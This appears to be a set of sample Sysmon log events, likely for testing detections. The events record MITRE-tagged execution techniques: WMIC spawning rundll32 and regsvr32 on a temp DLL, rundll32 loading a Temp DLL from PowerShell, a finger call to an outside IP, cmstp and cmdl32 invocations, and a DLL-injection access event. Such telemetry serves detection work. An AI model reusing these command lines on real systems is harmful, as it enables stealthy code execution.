<14>Jan  2 13:45:26 serhatg.local Microsoft-Windows-Sysmon[2372]: {"EventTime":1672667126,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":212245,"ProcessID":2372,"ThreadID":4072,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:45:26.000000\r\nProcessGuid: {66448266-c23e-6362-e708-000000000f00}\r\nProcessId: 5928\r\nImage: C:\\Windows\\System32\\cmdl32.exe\r\nFileVersion: 7.2.17763.1 (WinBuild.160101.0800)\r\nDescription: Microsoft Connection Manager Auto-Download\r\nProduct: Microsoft(R) Connection Manager\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CMDL32.EXE\r\nCommandLine: cmdl32  /vpn\r\nCurrentDirectory: C:\\Users\\Administrator\\\r\nUser: SG\\Administrator\r\nLogonGuid: {66448266-8d81-6362-6750-de0100000000}\r\nLogonId: 0x1DE5067\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=0A059F90BB3BA51CF1332406BE70275983C8452F,MD5=A7D1CD7846E8414CB349EF577D616F2E,SHA256=B12F21E80553CDD21DE07AB3067E4F8AD026BEA29EFB6420B50E448CDA852AFE,IMPHASH=AD55713E249A605BD30190ACBD0F9776\r\nParentProcessGuid: {66448266-8da2-6362-f606-000000000f00}\r\nParentProcessId: 7220\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:45:26.000000","ProcessGuid":"{66448266-c23e-6362-e708-000000000f00}","Image":"C:\\Windows\\System32\\cmdl32.exe","FileVersion":"7.2.17763.1 (WinBuild.160101.0800)","Description":"Microsoft Connection Manager Auto-Download","Product":"Microsoft(R) Connection Manager","Company":"Microsoft Corporation","OriginalFileName":"CMDL32.EXE","CommandLine":"cmdl32  /vpn","CurrentDirectory":"C:\\Users\\Administrator\\","User":"SG\\Administrator","LogonGuid":"{66448266-8d81-6362-6750-de0100000000}","LogonId":"0x1de5067","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=0A059F90BB3BA51CF1332406BE70275983C8452F,MD5=A7D1CD7846E8414CB349EF577D616F2E,SHA256=B12F21E80553CDD21DE07AB3067E4F8AD026BEA29EFB6420B50E448CDA852AFE,IMPHASH=AD55713E249A605BD30190ACBD0F9776","ParentProcessGuid":"{66448266-8da2-6362-f606-000000000f00}","ParentProcessId":"7220","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","ParentUser":"SG\\Administrator","EventReceivedTime":1672667126,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:45:36 serhatg.local Microsoft-Windows-Sysmon[2372]: {"EventTime":1672667136,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":212245,"ProcessID":2372,"ThreadID":4072,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:45:36.000000\r\nProcessGuid: {66448266-c23e-6362-e708-000000000f00}\r\nProcessId: 5928\r\nImage: C:\\Windows\\System32\\cmdl32.exe\r\nFileVersion: 7.2.17763.1 (WinBuild.160101.0800)\r\nDescription: Microsoft Connection Manager Auto-Download\r\nProduct: Microsoft(R) Connection Manager\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CMDL32.EXE\r\nCommandLine: cmdl32  /vpn\r\nCurrentDirectory: C:\\Users\\Administrator\\\r\nUser: SG\\Administrator\r\nLogonGuid: {66448266-8d81-6362-6750-de0100000000}\r\nLogonId: 0x1DE5067\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=0A059F90BB3BA51CF1332406BE70275983C8452F,MD5=A7D1CD7846E8414CB349EF577D616F2E,SHA256=B12F21E80553CDD21DE07AB3067E4F8AD026BEA29EFB6420B50E448CDA852AFE,IMPHASH=AD55713E249A605BD30190ACBD0F9776\r\nParentProcessGuid: {66448266-8da2-6362-f606-000000000f00}\r\nParentProcessId: 7220\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:45:36.000000","ProcessGuid":"{66448266-c23e-6362-e708-000000000f00}","Image":"C:\\Windows\\System32\\cmdl32.exe","FileVersion":"7.2.17763.1 (WinBuild.160101.0800)","Description":"Microsoft Connection Manager Auto-Download","Product":"Microsoft(R) Connection Manager","Company":"Microsoft Corporation","OriginalFileName":"CMDL32.EXE","CommandLine":"cmdl32  /vpn","CurrentDirectory":"C:\\Users\\Administrator\\","User":"SG\\Administrator","LogonGuid":"{66448266-8d81-6362-6750-de0100000000}","LogonId":"0x1de5067","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA1=0A059F90BB3BA51CF1332406BE70275983C8452F,MD5=A7D1CD7846E8414CB349EF577D616F2E,SHA256=B12F21E80553CDD21DE07AB3067E4F8AD026BEA29EFB6420B50E448CDA852AFE,IMPHASH=AD55713E249A605BD30190ACBD0F9776","ParentProcessGuid":"{66448266-8da2-6362-f606-000000000f00}","ParentProcessId":"7220","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","ParentUser":"SG\\Administrator","EventReceivedTime":1672667136,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:45:46 serhatg.local Microsoft-Windows-Sysmon[2800]: {"EventTime":1672667146,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":148382,"ProcessID":2800,"ThreadID":4172,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1218.002,technique_name=rundll32.exe\r\nUtcTime: 2023-01-02 13:45:46.000000\r\nProcessGuid: {b596e6b5-dc31-6357-7e01-000000000d00}\r\nProcessId: 5928\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: \"C:\\Windows\\system32\\rundll32.exe\" C:\\Users\\test\\AppData\\Local\\Temp\\FOO.dll\r\nCurrentDirectory: C:\\Users\\Administrator\\\r\nUser: SG\\Administrator\r\nLogonGuid: {b596e6b5-d891-6357-c127-200000000000}\r\nLogonId: 0x2027C1\r\nTerminalSessionId: 3\r\nIntegrityLevel: Medium\r\nHashes: SHA1=A40886F98905F3D9DBDD61DA1D59CCB4F4854758,MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A\r\nParentProcessGuid: {b596e6b5-daa5-6357-7301-000000000d00}\r\nParentProcessId: 5672\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1218.002,technique_name=rundll32.exe","UtcTime":"2023-01-02 13:45:46.000000","ProcessGuid":"{b596e6b5-dc31-6357-7e01-000000000d00}","Image":"C:\\Windows\\System32\\rundll32.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" C:\\Users\\test\\AppData\\Local\\Temp\\FOO.dll","CurrentDirectory":"C:\\Users\\Administrator\\","User":"SG\\Administrator","LogonGuid":"{b596e6b5-d891-6357-c127-200000000000}","LogonId":"0x2027c1","TerminalSessionId":"3","IntegrityLevel":"Medium","Hashes":"SHA1=A40886F98905F3D9DBDD61DA1D59CCB4F4854758,MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A","ParentProcessGuid":"{b596e6b5-daa5-6357-7301-000000000d00}","ParentProcessId":"5672","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","ParentUser":"SG\\Administrator","EventReceivedTime":1672667146,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:45:56 serhatg.local Microsoft-Windows-Sysmon[2800]: {"EventTime":1672667156,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":10,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":10,"OpcodeValue":0,"RecordNumber":148383,"ProcessID":2800,"ThreadID":4172,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process accessed:\r\nRuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection\r\nUtcTime: 2023-01-02 13:45:56.000000\r\nSourceProcessGUID: {b596e6b5-daa5-6357-7301-000000000d00}\r\nSourceProcessId: 5672\r\nSourceThreadId: 3596\r\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetProcessGUID: {b596e6b5-dc31-6357-7e01-000000000d00}\r\nTargetProcessId: 5928\r\nTargetImage: C:\\Windows\\system32\\rundll32.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a2044|C:\\Windows\\System32\\KERNELBASE.dll+4be72|C:\\Windows\\System32\\KERNELBASE.dll+48ff6|C:\\Windows\\System32\\KERNEL32.DLL+1c2e3|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+111dbf9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10750ca|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10ff6fd|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10ff3bb|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+120264f|UNKNOWN(00007FF9C0AA5251)\r\nSourceUser: SG\\Administrator\r\nTargetUser: SG\\Administrator","Category":"Process accessed (rule: ProcessAccess)","Opcode":"Info","RuleName":"technique_id=T1055.001,technique_name=Dynamic-link Library Injection","UtcTime":"2023-01-02 13:45:56.000000","SourceProcessGUID":"{b596e6b5-daa5-6357-7301-000000000d00}","SourceProcessId":"5672","SourceThreadId":"3596","SourceImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetProcessGUID":"{b596e6b5-dc31-6357-7e01-000000000d00}","TargetProcessId":"5928","TargetImage":"C:\\Windows\\system32\\rundll32.exe","GrantedAccess":"0x1fffff","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+a2044|C:\\Windows\\System32\\KERNELBASE.dll+4be72|C:\\Windows\\System32\\KERNELBASE.dll+48ff6|C:\\Windows\\System32\\KERNEL32.DLL+1c2e3|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\6d7b73667ead08cce6de05af17dd0064\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+111dbf9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10750ca|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10ff6fd|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+10ff3bb|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6108035bd5dffd63bb1c6f0605170d6a\\System.Management.Automation.ni.dll+120264f|UNKNOWN(00007FF9C0AA5251)","SourceUser":"SG\\Administrator","TargetUser":"SG\\Administrator","EventReceivedTime":1672667156,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:06 serhatg.local Microsoft-Windows-Sysmon[3264]: {"EventTime":1672667166,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":17843,"ProcessID":3264,"ThreadID":3452,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:46:06.000000\r\nProcessGuid: {5d3b726f-4683-633d-800a-000000000a00}\r\nProcessId: 4600\r\nImage: C:\\Windows\\System32\\finger.exe\r\nFileVersion: 10.0.20348.1 (WinBuild.160101.0800)\r\nDescription: TCPIP Finger Command\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: finger.exe\r\nCommandLine: finger  @1.1.1.1\r\nCurrentDirectory: C:\\ADContext\\\r\nUser: SG\\Administrator\r\nLogonGuid: {5d3b726f-d37e-633b-f424-140000000000}\r\nLogonId: 0x1424F4\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=A05968C6C9D9A1CB7C0D41B7BEB69FA1AC17EC28,MD5=DFE05BBC1657E7C80D6FED82507D1384,SHA256=6C6D5E1CAA81D6861B9C9EA905A1318969EACB57AB8ADAD389A7720A8053B887,IMPHASH=97268E1274EE1255E15DEA9048E09C06\r\nParentProcessGuid: {5d3b726f-d3bd-633b-f900-000000000a00}\r\nParentProcessId: 6212\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:46:06.000000","ProcessGuid":"{5d3b726f-4683-633d-800a-000000000a00}","Image":"C:\\Windows\\System32\\finger.exe","FileVersion":"10.0.20348.1 (WinBuild.160101.0800)","Description":"TCPIP Finger Command","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"finger.exe","CommandLine":"finger  @1.1.1.1","CurrentDirectory":"C:\\ADContext\\","User":"SG\\Administrator","LogonGuid":"{5d3b726f-d37e-633b-f424-140000000000}","LogonId":"0x1424f4","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA1=A05968C6C9D9A1CB7C0D41B7BEB69FA1AC17EC28,MD5=DFE05BBC1657E7C80D6FED82507D1384,SHA256=6C6D5E1CAA81D6861B9C9EA905A1318969EACB57AB8ADAD389A7720A8053B887,IMPHASH=97268E1274EE1255E15DEA9048E09C06","ParentProcessGuid":"{5d3b726f-d3bd-633b-f900-000000000a00}","ParentProcessId":"6212","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","ParentUser":"SG\\Administrator","EventReceivedTime":1672667166,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:16 serhatg.local Microsoft-Windows-Sysmon[8020]: {"EventTime":1672667176,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":2286,"ProcessID":8020,"ThreadID":4632,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:16.000000\r\nProcessGuid: {341034e7-2774-62ec-f606-000000000400}\r\nProcessId: 8548\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: \"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"rundll32.exe C:\\Users\\user\\AppData\\Local\\Temp\\calc.dll StartW\"\r\nCurrentDirectory: C:\\Users\\user\\AppData\\Local\\Temp\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-2003-62ec-9167-120000000000}\r\nLogonId: 0x126791\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA\r\nParentProcessGuid: {341034e7-2773-62ec-f406-000000000400}\r\nParentProcessId: 2280\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {wmic /node:127.0.0.1 process call create \\\"\"rundll32.exe $env:TEMP\\calc.dll StartW\\\"\"}\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:16.000000","ProcessGuid":"{341034e7-2774-62ec-f606-000000000400}","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"WMI Commandline Utility","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"wmic.exe","CommandLine":"\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"rundll32.exe C:\\Users\\user\\AppData\\Local\\Temp\\calc.dll StartW\"","CurrentDirectory":"C:\\Users\\user\\AppData\\Local\\Temp\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-2003-62ec-9167-120000000000}","LogonId":"0x126791","TerminalSessionId":"1","IntegrityLevel":"High","Hashes":"MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA","ParentProcessGuid":"{341034e7-2773-62ec-f406-000000000400}","ParentProcessId":"2280","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"powershell.exe\" &amp; {wmic /node:127.0.0.1 process call create \\\"\"rundll32.exe $env:TEMP\\calc.dll StartW\\\"\"}","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667176,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:26 serhatg.local Microsoft-Windows-Sysmon[8021]: {"EventTime":1672667186,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":2282,"ProcessID":8021,"ThreadID":4639,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:26.000000\r\nProcessGuid: {341034e7-2774-62ec-f606-000000000400}\r\nProcessId: 8541\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: \"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"regsvr32.exe C:\\Users\\user\\AppData\\Local\\Temp\\calc.dll StartW\"\r\nCurrentDirectory: C:\\Users\\user\\AppData\\Local\\Temp\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-2003-62ec-9167-120000000000}\r\nLogonId: 0x126791\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA\r\nParentProcessGuid: {341034e7-2773-62ec-f406-000000000400}\r\nParentProcessId: 2280\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {wmic /node:127.0.0.1 process call create \\\"\"regsvr32.exe $env:TEMP\\calc.dll StartW\\\"\"}\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:26.000000","ProcessGuid":"{341034e7-2774-62ec-f606-000000000400}","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"WMI Commandline Utility","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"wmic.exe","CommandLine":"\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create \"regsvr32.exe C:\\Users\\user\\AppData\\Local\\Temp\\calc.dll StartW\"","CurrentDirectory":"C:\\Users\\user\\AppData\\Local\\Temp\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-2003-62ec-9167-120000000000}","LogonId":"0x126791","TerminalSessionId":"1","IntegrityLevel":"High","Hashes":"MD5=A2EF3F0AD95FDA9262A5F9533B6DD1BD,SHA256=FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A,IMPHASH=D8770F1C24B7AAD7B5CD1817B3FEB2AA","ParentProcessGuid":"{341034e7-2773-62ec-f406-000000000400}","ParentProcessId":"2280","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"powershell.exe\" &amp; {wmic /node:127.0.0.1 process call create \\\"\"regsvr32.exe $env:TEMP\\calc.dll StartW\\\"\"}","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667186,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:36 serhatg.local Microsoft-Windows-Sysmon[3264]: {"EventTime":1672667196,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":17822,"ProcessID":3264,"ThreadID":3452,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-01-02 13:46:36.000000\r\nProcessGuid: {5d3b726f-4670-633d-7a0a-000000000a00}\r\nProcessId: 1164\r\nImage: C:\\Windows\\System32\\cmstp.exe\r\nFileVersion: 7.2.20348.1 (WinBuild.160101.0800)\r\nDescription: Microsoft Connection Manager Profile Installer\r\nProduct: Microsoft(R) Connection Manager\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CMSTP.EXE\r\nCommandLine: cmstp  /ni\r\nCurrentDirectory: C:\\ADContext\\\r\nUser: SG\\Administrator\r\nLogonGuid: {5d3b726f-d37e-633b-f424-140000000000}\r\nLogonId: 0x1424F4\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=91676CC4CB2FF9F27605592DA148D9F76EDC14AE,MD5=A3416F0C60168E271E5804123AB615D2,SHA256=E2B4BB4B9427E2D9EEF2C5752B6A265BDF8763953C23A4639A12395396154A0A,IMPHASH=109BA8ED3C458360A74EA1216207CA09\r\nParentProcessGuid: {5d3b726f-d3bd-633b-f900-000000000a00}\r\nParentProcessId: 6212\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \r\nParentUser: SG\\Administrator","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-01-02 13:46:36.000000","ProcessGuid":"{5d3b726f-4670-633d-7a0a-000000000a00}","Image":"C:\\Windows\\System32\\cmstp.exe","FileVersion":"7.2.20348.1 (WinBuild.160101.0800)","Description":"Microsoft Connection Manager Profile Installer","Product":"Microsoft(R) Connection Manager","Company":"Microsoft Corporation","OriginalFileName":"CMSTP.EXE","CommandLine":"cmstp  /ni","CurrentDirectory":"C:\\ADContext\\","User":"SG\\Administrator","LogonGuid":"{5d3b726f-d37e-633b-f424-140000000000}","LogonId":"0x1424f4","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA1=91676CC4CB2FF9F27605592DA148D9F76EDC14AE,MD5=A3416F0C60168E271E5804123AB615D2,SHA256=E2B4BB4B9427E2D9EEF2C5752B6A265BDF8763953C23A4639A12395396154A0A,IMPHASH=109BA8ED3C458360A74EA1216207CA09","ParentProcessGuid":"{5d3b726f-d3bd-633b-f900-000000000a00}","ParentProcessId":"6212","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","ParentUser":"SG\\Administrator","EventReceivedTime":1672667196,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
